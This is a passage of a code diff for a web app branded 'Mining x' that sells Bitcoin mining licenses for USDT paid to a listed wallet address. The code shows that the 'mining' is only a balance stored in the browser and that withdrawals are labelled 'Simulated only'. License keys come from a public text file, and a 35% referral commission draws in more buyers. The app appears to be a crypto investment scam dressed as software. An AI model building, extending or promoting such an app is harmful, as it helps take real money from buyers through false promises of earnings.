@@ -122,45 +122,64 @@
             <div class="flex justify-center space-x-2 mb-6">
                 <button id="package1Month" 
                         data-package="1_month" data-price="140" data-days="30"
-                        class="package-button flex-1 py-3 px-2 rounded-lg font-bold border border-gray-600 text-gray-300 bg-gray-700 hover:bg-gray-600 transition duration-150">
-                    1 Month ($140)
+                        class="package-button flex-1 py-3 px-2 rounded-lg font-bold border border-gray-600 text-gray-300 bg-gray-700 hover:bg-gray-600 transition duration-150 text-center">
+                    1 Month <br><span class="text-xl font-extrabold">$140</span>
                 </button>
-                <button id="package6Month"
+                <button id="package6Month" 
                         data-package="6_month" data-price="260" data-days="180"
-                        class="package-button flex-1 py-3 px-2 rounded-lg font-bold border border-gray-600 text-gray-300 bg-gray-700 hover:bg-gray-600 transition duration-150">
-                    6 Months ($260)
+                        class="package-button flex-1 py-3 px-2 rounded-lg font-bold border border-gray-600 text-gray-300 bg-gray-700 hover:bg-gray-600 transition duration-150 text-center selected">
+                    6 Month <br><span class="text-xl font-extrabold">$260</span>
                 </button>
-                <button id="package1Year" 
+                 <button id="package1Year" 
                         data-package="1_year" data-price="400" data-days="365"
-                        class="package-button flex-1 py-3 px-2 rounded-lg font-bold border border-gray-600 text-gray-300 bg-gray-700 hover:bg-gray-600 transition duration-150">
-                    1 Year ($400)
+                        class="package-button flex-1 py-3 px-2 rounded-lg font-bold border border-gray-600 text-gray-300 bg-gray-700 hover:bg-gray-600 transition duration-150 text-center">
+                    1 Year <br><span class="text-xl font-extrabold">$400</span>
                 </button>
             </div>
             
-            <div id="packageDetails" class="bg-gray-800 p-4 rounded-lg mb-6 text-center text-sm">
-                <p id="selectedPackageDisplay" class="font-bold text-lg text-miner-price mb-1">Select a package above.</p>
-                <p class="text-gray-400">Duration: <span id="durationDisplay">N/A</span> days</p>
-            </div>
+            <p class="text-center text-2xl text-white font-bold mb-6">Total Due: <span id="currentPriceDisplay">$260.00 USD</span></p>
 
-            <div class="mb-6">
-                <p class="text-gray-400 text-sm mb-2">Deposit Address (USDT TRC20)</p>
-                <div class="bg-gray-700 p-3 rounded-lg flex justify-between items-center">
-                    <span id="receivingWalletAddress" class="font-code text-usdt-green text-sm truncate">Loading...</span>
-                    <button id="copyAddressBtn" class="ml-3 text-miner-price hover:text-yellow-300 focus:outline-none transition duration-150" title="Copy Address">
-                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h12a2 2 0 002-2v-2m-2-4l-4 4m0 0l4 4m0-4h-8"></path></svg>
-                    </button>
+            <p class="text-sm text-gray-400 mb-4 leading-relaxed">
+                <span class="font-bold text-white">Automated Key Delivery:</span> Complete your transfer, provide your details, and submit the transaction screenshot below.
+            </p>
+
+            <div class="p-4 bg-gray-800 rounded-lg shadow-md border-l-4 border-miner-price space-y-3 mb-6">
+                <h3 class="text-xl font-semibold mb-3 text-miner-price">Transfer Details</h3>
+                
+                <div class="flex justify-between items-center text-sm">
+                    <span class="text-gray-400 font-semibold">Currency:</span>
+                    <span class="font-bold text-usdt-green">USDT (Tether)</span>
+                </div>
+                
+                <div class="flex justify-between items-center text-sm">
+                    <span class="text-gray-400 font-semibold">Network:</span>
+                    <span class="font-bold text-usdt-green">BEP20 (BNB Smart Chain)</span>
+                </div>
+
+                <div class="text-sm">
+                    <span class="block text-gray-400 font-semibold mb-1">Wallet Address:</span>
+                    <div class="relative">
+                        <input type="text" readonly value="0x480fd381d70ddad4b0d21a9e763300ad6fb3ef89" id="walletAddressDisplay" class="w-full p-2 pr-10 rounded bg-gray-700 text-miner-price font-code text-xs break-all" onclick="this.select()">
+                        <button id="copyAddressBtn" class="absolute right-0 top-0 h-full px-2 text-gray-400 hover:text-white transition">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h12a2 2 0 002-2v-2m-2 2h-4m2-4v4m2 0h-4m-4 0v4m-2-4h4m-4 0v4M6 9h14M8 5v4"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 4v1m0 0v1m-2-2h-4m-2 0h-4m-2 0v1m0 0v1m2 0h4m2 0h4m-4 0v1m0 0v1"></path></svg>
+                        </button>
+                    </div>
                 </div>
             </div>
 
-            <div class="mb-6">
-                <label for="payerEmailInput" class="block text-gray-400 text-sm font-bold mb-2">Your Email (for key activation)</label>
-                <input type="email" id="payerEmailInput" placeholder="your@email.com" class="w-full p-3 rounded bg-gray-700 border border-gray-600 text-white focus:ring-usdt-green focus:border-usdt-green">
+            <div class="mb-4">
+                <label for="payerEmail" class="block text-sm font-medium text-gray-300">Your Email Address (for key delivery)</label>
+                <input type="email" id="payerEmail" placeholder="youremail@example.com" class="w-full p-3 mt-1 rounded bg-gray-700 border border-gray-600 text-white focus:ring-usdt-green focus:border-usdt-green">
             </div>
-
+            
             <div class="mb-6">
-                <label for="transactionScreenshot" class="block text-gray-400 text-sm font-bold mb-2">Transaction Screenshot (Proof of Payment)</label>
+                <label for="transactionScreenshot" class="block text-sm font-medium text-gray-300 mb-2">
+                    Transaction Screenshot (Proof of Payment)
+                </label>
                 <input type="file" id="transactionScreenshot" accept="image/*" class="hidden">
-                <label for="transactionScreenshot" id="screenshotLabel" class="custom-file-input block text-gray-400 hover:text-white transition"> Tap to Upload Image </label>
+                <label for="transactionScreenshot" id="screenshotLabel" class="custom-file-input block text-gray-400 hover:text-white transition">
+                    Tap to Upload Image
+                </label>
                 <p id="fileNameDisplay" class="text-xs text-gray-500 mt-2 italic text-center">No file selected.</p>
             </div>
 
@@ -168,29 +187,72 @@
                 Payment Has Been Made - Submit Request
             </button>
             
-            <p id="paymentConfirmationMessage" class="mt-4 text-center text-miner-info hidden">
-                Your payment intent has been logged. Please wait for email confirmation.
+            <p id="paymentConfirmationMessage" class="mt-4 text-center text-sm text-miner-info font-semibold hidden p-3 bg-miner-dark rounded border border-miner-info">
+                Your payment intent has been logged and sent to <span class="font-bold">mining.x.official@gmail.com</span>. Once confirmed, the license key will be delivered to your email.
             </p>
-            <p id="paymentError" class="mt-4 text-center text-miner-warning hidden">
-                An error occurred during submission.
-            </p>
-            
-            <p class="text-xs text-gray-500 text-center mt-4">
-                Min. withdrawal: $<span id="minUsdWithdrawalDisplay">Loading...</span>. Fee: <span id="networkFeeDisplay">Loading...</span> BTC.
+             <p id="paymentError" class="mt-4 text-center text-sm text-miner-warning font-semibold hidden p-3 bg-miner-dark rounded border border-miner-warning">
+                Error logging payment intent. Please try again.
             </p>
         </div>
     </div>
 
-    <div id="mainContent" class="w-full max-w-md hidden">
-        <div class="flex justify-between items-center mb-6">
-            <h1 class="text-2xl font-bold font-code text-miner-status-border">Mining x</h1>
-            <div id="statusIndicator" class="text-miner-info font-bold flex items-center">
-                <span class="relative flex h-3 w-3 mr-2">
-                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-miner-info opacity-75"></span>
-                    <span class="relative inline-flex rounded-full h-3 w-3 bg-miner-info"></span>
-                </span>
-                ACTIVE
+
+    <div id="referralProgramPage" class="w-full max-w-md hidden min-h-screen pt-12 pb-12">
+        <button id="backToLoginBtn" class="mb-6 text-miner-status-border hover:text-blue-400 flex items-center transition duration-150">
+            <svg class="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+            <span class="text-sm font-semibold">Back to Login</span>
+        </button>
+        
+        <div class="bg-miner-console p-6 rounded-xl shadow-2xl border-t-4 border-miner-price">
+            <h2 class="text-3xl font-extrabold text-center mb-6 text-miner-price uppercase tracking-wider">
+                Partner Program
+            </h2>
+            
+            <div class="space-y-6 text-gray-300">
+                <p class="text-lg leading-relaxed border-b border-gray-700 pb-4">
+                    Share this app with your network! We offer a massive <span class="text-miner-info font-extrabold text-xl">35% commission</span> on *any* license package value purchased by your referrals!
+                </p>
+
+                <div class="p-4 bg-gray-800 rounded-lg shadow-md border-l-4 border-miner-info">
+                    <h3 class="text-xl font-semibold mb-2 text-miner-info">Earning Potential (35% Commission)</h3>
+                    <ul class="list-disc list-inside space-y-1 text-sm">
+                        <li>1-Month Package ($140): You earn <span class="text-miner-price font-bold">$49.00 USD</span></li>
+                        <li>6-Month Package ($260): You earn <span class="text-miner-price font-bold">$91.00 USD</span></li>
+                        <li>1-Year Package ($400): You earn <span class="text-miner-price font-bold">$140.00 USD</span></li>
+                    </ul>
+                    <ul class="list-disc list-inside space-y-1 text-xs text-gray-400 mt-3">
+                        <li>Payout threshold: $50 USD.</li>
+                        <li>Payouts are processed monthly via BTC transfer.</li>
+                    </ul>
+                </div>
+                
+                <div class="pt-4 border-t border-gray-700 text-center">
+                     <p class="text-base text-white font-semibold mb-3">Get your unique referral code instantly:</p>
+                     <a href="https://t.me/MiningXowner" target="_blank" class="inline-block bg-miner-warning text-white py-3 px-8 rounded-lg font-bold hover:bg-red-600 transition duration-150 shadow-lg uppercase tracking-wider">
+                        Contact Telegram Support
+                    </a>
+                </div>
             </div>
+        </div>
+    </div>
+
+
+    <div id="mainContent" class="max-w-md w-full hidden">
+        <div class="mb-4">
+            <div id="minerLogo" class="font-code text-miner-price text-2xl leading-none">
+                <pre>
+88""Yb 888888 dP""b8 
+88__dP   88  dP   `" 
+88""Yb   88  Yb      
+88oodP   88   YboodP
+                </pre>
+            </div>
+
+            <p class="text-gray-500 text-xs text-right mt-1 font-code">v1.00</p>
+            
+            <div class="border-t-2 border-miner-status-border my-2"></div>
+            
+            <h1 class="text-2xl text-white font-bold text-center">mining x</h1>
         </div>
 
         <div class="bg-miner-console border border-miner-status-border p-4 mb-5 rounded-lg shadow-lg status-pulse">
@@ -199,191 +261,189 @@
             <p class="text-miner-info font-code">USD Value: $<span id="usd_value">0.00</span></p>
             <p class="text-sm text-gray-500 mt-2">License Expires: <span id="expiration_date_display" class="font-code text-xs text-miner-warning">Checking...</span></p>
         </div>
-
+        
         <div class="flex space-x-4 mb-5">
-            <button id="withdrawBtn" class="flex-1 bg-usdt-green text-gray-900 py-3 rounded-lg font-bold hover:bg-teal-400 transition duration-150 uppercase tracking-wider">
-                Withdraw
+            <button id="startMiningBtn" class="flex-1 bg-miner-info text-white py-3 rounded-lg font-bold hover:bg-green-600 transition duration-150">
+                Start Mining
             </button>
-            <button id="logoutBtn" class="bg-gray-600 text-white py-3 px-6 rounded-lg font-bold hover:bg-gray-500 transition duration-150">
-                Logout
+            <button id="stopMiningBtn" class="flex-1 bg-gray-500 text-white py-3 rounded-lg font-bold hover:bg-gray-600 transition duration-150 opacity-50" disabled>
+                Stop Mining
             </button>
         </div>
 
-        <div id="withdrawalForm" class="bg-miner-console p-4 rounded-lg border border-gray-700 mb-5 hidden">
-            <h3 class="text-xl font-bold mb-4 text-miner-price">Initiate Withdrawal</h3>
-            <div class="mb-4">
-                <label for="withdrawAmount" class="block text-gray-400 text-sm font-bold mb-2">Amount to Withdraw (BTC)</label>
-                <input type="number" id="withdrawAmount" placeholder="0.00000000" class="w-full p-3 rounded bg-gray-700 border border-gray-600 text-white font-code focus:ring-usdt-green focus:border-usdt-green" step="0.00000001">
+        <button id="withdrawBtn" class="w-full bg-miner-warning text-white py-3 rounded-lg font-bold hover:bg-red-600 transition duration-150">
+            Withdraw
+        </button>
+
+        <div id="console" class="console-output bg-miner-console p-3 h-48 overflow-y-scroll rounded-lg mt-5 font-code text-sm">
+            <p style="color: #38a169;">Loading miner state from local storage...</p>
+        </div>
+        
+        <div id="withdrawalForm" class="bg-gray-800 p-5 mt-6 rounded-lg hidden border border-miner-warning">
+            <h3 class="text-xl font-bold mb-3 text-miner-price">Withdraw BTC</h3>
+
+            <div class="mb-3">
+                <label for="address" class="block text-sm font-medium text-gray-300">Wallet Address</label>
+                <input type="text" id="address" value="3J98t1WpEZ73CNmQviecrnyiW" required class="w-full p-2 mt-1 rounded bg-gray-700 border border-gray-600 text-white focus:ring-miner-status-border focus:border-miner-status-border" placeholder="Recipient address">
             </div>
-            <button id="confirmWithdrawBtn" class="w-full bg-miner-status-border text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition duration-150 mb-3">
+            
+            <div class="mb-3">
+                <label for="network" class="block text-sm font-medium text-gray-300">Network</label>
+                <select id="network" class="w-full p-2 mt-1 rounded bg-gray-700 border border-gray-600 text-white cursor-not-allowed" disabled>
+                    <option>Bitcoin Network (BTC)</option>
+                </select>
+                <p class="text-xs text-gray-400 mt-1">Simulated only: BTC is the only supported network.</p>
+            </div>
+
+            <div class="mb-3">
+                <label for="amount" class="block text-sm font-medium text-gray-300 flex justify-between">
+                    Amount
+                    <span id="maxAmount" class="text-xs text-miner-status-border cursor-pointer hover:underline">MAX</span>
+                </label>
+                <input type="number" id="amount" step="0.00000001" min="0.00000001" value="0.00000001" required class="w-full p-2 mt-1 rounded bg-gray-700 border border-gray-600 text-white focus:ring-miner-status-border focus:border-miner-status-border" placeholder="Enter amount">
+            </div>
+
+            <div class="mt-5 space-y-2 text-sm">
+                <div class="flex justify-between text-gray-400">
+                    <span>Network Fee (Fixed)</span>
+                    <span id="networkFeeDisplay" class="font-code text-white">0.00000050 BTC</span>
+                </div>
+                <div class="flex justify-between text-miner-info font-bold pt-2 border-t border-gray-700">
+                    <span>Amount You Will Receive</span>
+                    <span id="receivedAmount" class="font-code">0.00000000 BTC</span>
+                </div>
+                 <p id="minWithdrawalInfo" class="text-xs text-gray-500 mt-1 text-center italic"></p>
+            </div>
+            
+            <button id="submitWithdrawal" class="w-full bg-miner-warning text-white py-3 rounded-lg font-bold hover:bg-red-600 transition duration-150 mt-5">
                 Confirm Withdrawal
             </button>
-            <p id="withdrawalStatus" class="text-center text-sm text-miner-warning"></p>
+            <p id="withdrawalStatus" class="mt-4 text-center text-sm"></p>
         </div>
-
-        <h2 class="text-lg font-bold mb-3 text-miner-status-border font-code">Console Output:</h2>
-        <div id="consoleOutput" class="console-output bg-miner-console p-3 h-48 overflow-y-scroll rounded-lg border border-gray-700 text-sm font-code">
-            </div>
     </div>
 
-    <div id="appModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center p-4 z-50">
-        <div class="bg-miner-console p-6 rounded-lg w-full max-w-sm border-t-4 border-miner-warning shadow-2xl">
-            <h3 id="modalTitle" class="text-xl font-bold mb-3 text-miner-warning">Modal Title</h3>
-            <p id="modalMessage" class="text-gray-300 mb-5">Modal message content.</p>
-            <button id="modalCloseBtn" class="w-full bg-miner-status-border text-white py-2 rounded-lg font-bold hover:bg-blue-700 transition duration-150">
-                Close
-            </button>
+    <div id="customModal" class="fixed inset-0 bg-black bg-opacity-75 hidden flex items-center justify-center p-4 z-50">
+        <div class="bg-gray-900 p-6 rounded-lg max-w-sm w-full shadow-2xl border-t-4 border-miner-warning">
+            <h4 id="modalTitle" class="text-xl font-bold text-miner-warning mb-3">Error</h4>
+            <p id="modalMessage" class="text-gray-300 mb-5"></p>
+            <button id="modalCloseBtn" class="w-full bg-miner-status-border text-white py-2 rounded-lg hover:bg-blue-700 transition">OK</button>
         </div>
     </div>
 
     <script>
-        // --- CONSTANTS ---
-        const STARTING_BALANCE = 0.00000000;
-        const REMOTE_KEY_URL = '/.netlify/functions/license';
-        const MINE_URL = '/.netlify/functions/mine';
-        const PAYMENTS_URL = '/.netlify/functions/payments';
-        const MAX_RETRIES = 3;
-        const TELEGRAM_URL = 'https://t.me/MiningXowner';
+        
+        // --- Configuration ---
+        const REMOTE_KEY_URL = 'https://raw.githubusercontent.com/Mining-x/btc-miner-app/refs/heads/main/keys.txt';
+        const TELEGRAM_URL = 'https://t.me/@MiningXowner'; 
+        const MAX_RETRIES = 3; 
+        const STARTING_BALANCE = 0.00000001;
+        const MIN_USD_WITHDRAWAL = 100.00; 
+        
+        // Target email for payment notifications (for logging purpose)
+        const TARGET_EMAIL_LOG = 'mining.x.official@gmail.com'; 
 
-        // --- NEW PRICE CONSTANTS ---
-        const BINANCE_PRICE_URL = 'https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT';
-        const PRICE_UPDATE_INTERVAL_MS = 300; // Update price every 300ms
-
-        // --- Package Configuration (Client-side mirror of server) ---
-        // Used to display price/duration on the payment page before submission
-        const CLIENT_PACKAGES = {
-            '1_month': { price: 140.00, days: 30, label: '1 Month' },
-            '6_month': { price: 260.00, days: 180, label: '6 Months' },
-            '1_year': { price: 400.00, days: 365, label: '1 Year' }
+        // Package Constants (UPDATED)
+        const PACKAGES = {
+            '1_month': { price: 140, days: 30, label: '1 Month' },
+            '6_month': { price: 260, days: 180, label: '6 Month' }, // NEW
+            '1_year': { price: 400, days: 365, label: '1 Year' }
         };
 
-        // --- Intervals and Keys ---
-        let miningRate = 1000; // Default: 1 second per cycle
-        let miningInterval = null;
-        let btcPriceInterval = null; // NEW: Interval for real BTC price updates
-        let activeLicenseKey = localStorage.getItem('minerCurrentLicenseKey');
-        let currentPackageKey = '1_month'; // Default package
-        
         // --- Local State Management Keys ---
-        const ACTIVATED_LICENSES_KEY = 'minerActivatedLicenses';
+        const ACTIVATED_LICENSES_KEY = 'minerActivatedLicenses'; 
         const CURRENT_LICENSE_ID_KEY = 'minerCurrentLicenseKey';
         const DEVICE_ID_KEY = 'minerDeviceID'; 
-
+        
         // --- Application State ---
         let minerState = {
             balance: STARTING_BALANCE,
-            btc_price: 0.00, // Will be set by fetchRealBtcPrice
-            usd_value: 0.00,
-            expiration_date: null,
-            network_fee: 0.00010000,
-            min_usd_withdrawal: 100.00,
-            receiving_wallet_address: 'Loading...',
+            btc_price: 65000.00
         };
+        let miningInterval = null; 
+        let priceUpdateInterval = null; // Added for BTC price auto-update
+        const NETWORK_FEE = 0.00000050; 
+        let activeLicenseKey = null; 
+
+        // Dynamic state for purchase flow
+        let currentPackageKey = '6_month'; // Default to 6 Month package
+        let currentPrice = PACKAGES[currentPackageKey].price;
+        let currentDurationDays = PACKAGES[currentPackageKey].days;
+
 
         // --- DOM Elements ---
-        const lockScreen = document.getElementById('lockScreen');
-        const paymentPage = document.getElementById('paymentPage');
-        const mainContent = document.getElementById('mainContent');
-        const licenseKeyInput = document.getElementById('licenseKeyInput');
-        const enterKeyBtn = document.getElementById('enterKeyBtn');
-        const buyNowBtn = document.getElementById('buyNowBtn');
-        const backFromPaymentBtn = document.getElementById('backFromPaymentBtn');
-        const packageButtons = document.querySelectorAll('.package-button');
-        const paymentMadeBtn = document.getElementById('paymentMadeBtn');
-        const payerEmailInput = document.getElementById('payerEmailInput');
-        const transactionScreenshotInput = document.getElementById('transactionScreenshot');
-        const fileNameDisplay = document.getElementById('fileNameDisplay');
-        const paymentConfirmationMessage = document.getElementById('paymentConfirmationMessage');
-        const paymentError = document.getElementById('paymentError');
-        const consoleOutput = document.getElementById('consoleOutput');
-        const balanceDisplay = document.getElementById('balance');
-        const btcPriceDisplay = document.getElementById('btc_price');
-        const usdValueDisplay = document.getElementById('usd_value');
-        const expirationDateDisplay = document.getElementById('expiration_date_display');
-        const receivingWalletAddressDisplay = document.getElementById('receivingWalletAddress');
-        const networkFeeDisplay = document.getElementById('networkFeeDisplay');
-        const minUsdWithdrawalDisplay = document.getElementById('minUsdWithdrawalDisplay');
+        const consoleOutput = document.getElementById('console');
+        const balanceSpan = document.getElementById('balance');
+        const priceSpan = document.getElementById('btc_price');
+        const usdValueSpan = document.getElementById('usd_value');
         const withdrawBtn = document.getElementById('withdrawBtn');
         const withdrawalForm = document.getElementById('withdrawalForm');
-        const confirmWithdrawBtn = document.getElementById('confirmWithdrawBtn');
-        const withdrawAmountInput = document.getElementById('withdrawAmount');
+        const submitWithdrawal = document.getElementById('submitWithdrawal');
         const withdrawalStatus = document.getElementById('withdrawalStatus');
-        const modal = document.getElementById('appModal');
+        const startMiningBtn = document.getElementById('startMiningBtn');
+        const stopMiningBtn = document.getElementById('stopMiningBtn');
+        const expirationDateDisplay = document.getElementById('expiration_date_display');
+        const minWithdrawalInfo = document.getElementById('minWithdrawalInfo');
+
+        const licenseKeyInput = document.getElementById('licenseKeyInput');
+        const enterKeyBtn = document.getElementById('enterKeyBtn');
+        const lockScreen = document.getElementById('lockScreen');
+        const mainContent = document.getElementById('mainContent');
+        const referralProgramPage = document.getElementById('referralProgramPage'); 
+        const paymentPage = document.getElementById('paymentPage'); 
+        
+        const referralLink = document.getElementById('referralLink'); 
+        const buyNowBtn = document.getElementById('buyNowBtn'); 
+        const backToLoginBtn = document.getElementById('backToLoginBtn'); 
+        const backFromPaymentBtn = document.getElementById('backFromPaymentBtn'); 
+        const lockMessage = document.getElementById('lockMessage');
+        
+        // Payment Page Elements
+        const paymentMadeBtn = document.getElementById('paymentMadeBtn'); 
+        const paymentConfirmationMessage = document.getElementById('paymentConfirmationMessage'); 
+        const paymentError = document.getElementById('paymentError');
+        const payerEmailInput = document.getElementById('payerEmail'); 
+        const copyAddressBtn = document.getElementById('copyAddressBtn'); 
+        const currentPriceDisplay = document.getElementById('currentPriceDisplay'); 
+        const packageButtons = document.querySelectorAll('.package-button'); 
+        const transactionScreenshotInput = document.getElementById('transactionScreenshot'); 
+        const fileNameDisplay = document.getElementById('fileNameDisplay'); 
+
+        const amountInput = document.getElementById('amount');
+        const receivedAmountSpan = document.getElementById('receivedAmount');
+        const maxAmountBtn = document.getElementById('maxAmount');
+
+        const customModal = document.getElementById('customModal');
         const modalTitle = document.getElementById('modalTitle');
         const modalMessage = document.getElementById('modalMessage');
         const modalCloseBtn = document.getElementById('modalCloseBtn');
-        const lockMessage = document.getElementById('lockMessage');
-        const selectedPackageDisplay = document.getElementById('selectedPackageDisplay');
-        const durationDisplay = document.getElementById('durationDisplay');
-        const copyAddressBtn = document.getElementById('copyAddressBtn');
-        const logoutBtn = document.getElementById('logoutBtn');
-        const referralLink = document.getElementById('referralLink');
+        modalCloseBtn.addEventListener('click', () => customModal.classList.add('hidden'));
 
 
-        // --- UTILITY FUNCTIONS ---
-        
-        function logToConsole(message, color) {
-            const now = new Date();
-            const timeString = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        // ------------------------------------------------
+        // 1. UTILITY & STATE FUNCTIONS
+        // ------------------------------------------------
+
+        function showModal(title, message, isError = true) {
+            modalTitle.textContent = title;
+            modalMessage.textContent = message;
+            customModal.classList.remove('hidden');
+            customModal.querySelector('.border-t-4').classList.toggle('border-miner-warning', isError);
+            customModal.querySelector('.border-t-4').classList.toggle('border-miner-info', !isError);
+            modalTitle.classList.toggle('text-miner-warning', isError);
+            modalTitle.classList.toggle('text-miner-info', !isError);
+            modalCloseBtn.focus();
+        }
+
+        function logToConsole(message, color = '#ffffff') {
             const p = document.createElement('p');
-            p.className = `text-xs mb-1 font-code`;
             p.style.color = color;
-            p.innerHTML = `[${timeString}] ${message}`;
+            p.textContent = message;
             consoleOutput.appendChild(p);
-            // Auto-scroll to the bottom
             consoleOutput.scrollTop = consoleOutput.scrollHeight;
         }
-
-        function updateDisplay() {
-            balanceDisplay.textContent = minerState.balance.toFixed(8);
-            btcPriceDisplay.textContent = minerState.btc_price.toFixed(2);
-            minerState.usd_value = minerState.balance * minerState.btc_price;
-            usdValueDisplay.textContent = minerState.usd_value.toFixed(2);
-            
-            // Update license expiration display
-            if (minerState.expiration_date) {
-                const now = new Date();
-                const exp = new Date(minerState.expiration_date);
-                const diffTime = exp.getTime() - now.getTime();
-                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
-                
-                if (diffDays > 0) {
-                    expirationDateDisplay.textContent = `${exp.toLocaleDateString()} (${diffDays} days left)`;
-                    expirationDateDisplay.classList.remove('text-miner-warning');
-                    expirationDateDisplay.classList.add('text-miner-info');
-                } else {
-                    expirationDateDisplay.textContent = 'EXPIRED. Please renew.';
-                    expirationDateDisplay.classList.remove('text-miner-info');
-                    expirationDateDisplay.classList.add('text-miner-warning');
-                    stopMining();
-                }
-            } else {
-                 expirationDateDisplay.textContent = 'N/A - Not Active';
-            }
-        }
-
-        function saveMinerState() {
-            const stateKey = getCurrentStateKey();
-            if (stateKey) {
-                localStorage.setItem(stateKey, JSON.stringify({
-                    balance: minerState.balance,
-                    btc_price: minerState.btc_price, // Save latest price (optional, but good practice)
-                    expiration_date: minerState.expiration_date
-                }));
-            }
-        }
-
-        function getDeviceId() {
-            let deviceId = localStorage.getItem(DEVICE_ID_KEY);
-            if (!deviceId) {
-                deviceId = crypto.randomUUID();
-                localStorage.setItem(DEVICE_ID_KEY, deviceId);
-            }
-            return deviceId;
-        }
-
-        function updateView(viewId) {
-            const views = [lockScreen, paymentPage, mainContent];
+        
+        function showView(viewId) {
+            const views = [lockScreen, mainContent, referralProgramPage, paymentPage];
             views.forEach(view => {
                 if (view.id === viewId) {
                     view.classList.remove('hidden');
@@ -396,9 +456,9 @@
                     view.classList.add('hidden');
                 }
             });
-            // Stop all activity when leaving the main content view
+
             if (viewId !== 'mainContent' && miningInterval !== null) {
-                stopMining(); 
+                stopMining();
             }
         }
 
@@ -410,332 +470,502 @@
         function loadMinerState() {
             const stateKey = getCurrentStateKey();
             if (!stateKey) {
-                minerState.balance = STARTING_BALANCE;
+                minerState.balance = STARTING_BALANCE; 
                 return;
             }
+
             try {
                 const storedState = localStorage.getItem(stateKey);
                 if (storedState) {
-                    const state = JSON.parse(storedState);
-                    minerState.balance = state.balance || STARTING_BALANCE;
-                    minerState.expiration_date = state.expiration_date;
+                    const loadedState = JSON.parse(storedState);
+                    minerState.balance = loadedState.balance || STARTING_BALANCE;
+                    minerState.btc_price = loadedState.btc_price || minerState.btc_price;
+                    logToConsole(`Miner state loaded for key ${activeLicenseKey.substring(0, 4)}...`, '#38a169');
                 } else {
-                     minerState.balance = STARTING_BALANCE;
+                    minerState.balance = STARTING_BALANCE;
+                    logToConsole(`New state initialized for key ${activeLicenseKey.substring(0, 4)}...`, '#38a169');
+                    saveMinerState(); 
                 }
             } catch (e) {
-                console.error("Error loading state:", e);
+                logToConsole("Error loading miner state. Starting with default.", '#dc3545');
                 minerState.balance = STARTING_BALANCE;
             }
         }
+
+        function saveMinerState() {
+            const stateKey = getCurrentStateKey();
+            if (!stateKey) return; 
+
+            try {
+                localStorage.setItem(stateKey, JSON.stringify(minerState));
+            } catch (e) {
+                logToConsole("Warning: Could not save miner state to local storage.", '#dc3545');
+            }
+        }
         
-        function selectPackage(packageKey) {
-            currentPackageKey = packageKey;
-            const details = CLIENT_PACKAGES[packageKey];
+        function updateMinWithdrawalDisplay() {
+            const requiredBtc = MIN_USD_WITHDRAWAL / minerState.btc_price;
+            minWithdrawalInfo.textContent = `Minimum withdrawal: $${MIN_USD_WITHDRAWAL.toFixed(2)} (${requiredBtc.toFixed(8)} BTC)`;
+        }
+
+
+        function updateDisplay() {
+            balanceSpan.textContent = minerState.balance.toFixed(8);
+            priceSpan.textContent = minerState.btc_price.toFixed(2);
+            usdValueSpan.textContent = (minerState.balance * minerState.btc_price).toFixed(2);
             
-            packageButtons.forEach(btn => {
-                if (btn.dataset.package === packageKey) {
-                    btn.classList.add('selected');
+            updateReceivedAmount();
+            updateMinWithdrawalDisplay();
+
+            saveMinerState(); 
+        }
+
+        function getActivatedLicenses() {
+            try {
+                const json = localStorage.getItem(ACTIVATED_LICENSES_KEY);
+                return json ? JSON.parse(json) : {};
+            } catch {
+                return {};
+            }
+        }
+
+        function saveActivatedLicenses(licenses) {
+            try {
+                localStorage.setItem(ACTIVATED_LICENSES_KEY, JSON.stringify(licenses));
+            } catch (e) {
+                logToConsole("Error saving license activation list.", '#dc3545');
+            }
+        }
+        
+        function updateReceivedAmount() {
+            const amount = parseFloat(amountInput.value) || 0;
+            const received = amount - NETWORK_FEE;
+            receivedAmountSpan.textContent = received > 0 ? received.toFixed(8) + ' BTC' : '0.00000000 BTC';
+            receivedAmountSpan.style.color = received > 0 ? '#38a169' : '#dc3545';
+        }
+
+        /**
+         * Updates the selected package state and UI on the payment page.
+         * @param {string} pkgKey - The key of the selected package ('1_month', '6_month', or '1_year').
+         */
+        function selectPackage(pkgKey) {
+            const pkg = PACKAGES[pkgKey];
+            if (!pkg) return;
+
+            currentPackageKey = pkgKey;
+            currentPrice = pkg.price;
+            currentDurationDays = pkg.days;
+
+            currentPriceDisplay.textContent = `$${currentPrice.toFixed(2)} USD`;
+            
+            // Update button styles
+            packageButtons.forEach(button => {
+                if (button.dataset.package === pkgKey) {
+                    button.classList.add('selected');
                 } else {
-                    btn.classList.remove('selected');
+                    button.classList.remove('selected');
                 }
             });
-
-            selectedPackageDisplay.textContent = `${details.label} License ($${details.price.toFixed(2)})`;
-            durationDisplay.textContent = details.days;
         }
 
-        function showModal(title, message, isError = false) {
-            modalTitle.textContent = title;
-            modalMessage.textContent = message;
-            if (isError) {
-                modalTitle.classList.remove('text-miner-info');
-                modalTitle.classList.add('text-miner-warning');
-                modal.querySelector('div').classList.remove('border-miner-status-border');
-                modal.querySelector('div').classList.add('border-miner-warning');
-            } else {
-                modalTitle.classList.remove('text-miner-warning');
-                modalTitle.classList.add('text-miner-info');
-                modal.querySelector('div').classList.remove('border-miner-warning');
-                modal.querySelector('div').classList.add('border-miner-status-border');
+
+        // ------------------------------------------------
+        // 2. REMOTE KEY FETCH & LICENSE CONTROL
+        // ------------------------------------------------
+        
+        function getDeviceID() {
+            let deviceId = localStorage.getItem(DEVICE_ID_KEY);
+            if (!deviceId) {
+                deviceId = crypto.randomUUID();
